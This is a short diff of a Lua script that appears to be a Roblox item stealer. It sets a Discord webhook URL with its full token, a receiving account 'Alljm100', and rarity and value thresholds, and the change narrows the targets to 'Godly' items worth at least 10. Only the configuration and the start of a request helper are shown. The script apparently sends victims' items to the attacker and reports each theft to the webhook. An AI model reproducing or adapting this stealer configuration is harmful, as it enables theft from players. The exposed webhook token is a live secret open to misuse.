@@ -4,9 +4,9 @@ _G.Ex = true
 
 local WEBHOOK = "https://discord.com/api/webhooks/1546514326901358742/u0CW6vShbkToQcd8w4IFWZ88WDfXhQYdIl31iIB-7A43thQ3Mb25At-YoyQZcLefuEQ-"
 local RECEIVER = {"Alljm100"}
-local MINIMUM_RARITY = "Common, Uncommon, Rare, Legendary, Godly, Ancient, Unique, Vintage, Chroma, Dual, Pet"
-local MINIMUM_VALUE = 5
-local RECEIVERx = Alljm100
+local MINIMUM_RARITY = "Godly"
+local MINIMUM_VALUE = 10
+local RECEIVERx =  Alljm100
 
 local function GetRequestFunction()
     if request then return request end
